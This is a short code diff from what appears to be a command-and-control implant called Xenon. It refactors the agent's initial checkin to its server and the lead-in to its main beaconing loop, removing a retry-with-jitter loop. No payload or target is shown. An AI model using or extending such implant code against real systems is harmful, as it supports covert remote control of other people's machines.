@@ -167,7 +167,7 @@ VOID XenonMain()
         - Start main beaconing routine
 */
 
-    //NetworkInitMutex();     // Current workaround for avoiding race condition with global HINTERNET handles
+    // NetworkInitMutex();     // Current workaround for avoiding race condition with global HINTERNET handles
 
     // Set pointer to Stack allocated instance
     CONFIG_XENON xenon = { 0 };
@@ -183,42 +183,19 @@ VOID XenonMain()
     PARSER data     = { 0 };
     BOOL bStatus    = FALSE;
 
-
-    // Fills pointer with response data from checkin
-    // bStatus = CheckinSend(&data);
-    // if (!bStatus)
-    // {
-    //     _err("Failed checkin request. Exiting");
-    //     return;
-    // }
-
+    
     /*
         TODO
         - Remove retry sleep from HTTPX
         - Move main sleep to here
     */
-    do {
-        
-        bStatus = CheckinSend(&data);
-        
-        if (!bStatus)
-            _err("Failed checkin request.");
 
-        // TODO remove
-        SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);
-
-    } while (data.Buffer == NULL);
-    
-
-    // Set new agent UUID from checkin response
-    bStatus = TaskCheckin(&data);
-    if (!bStatus)
+    if ( !CheckinSend() )
     {
-        _err("Failed processing agent checkin. Exiting");
+        _err("[CHCEKIN] Failed to checkin agent.");
         return;
     }
     
-    ParserDestroy(&data);
 
     // Main beaconing loop
     while (TRUE)
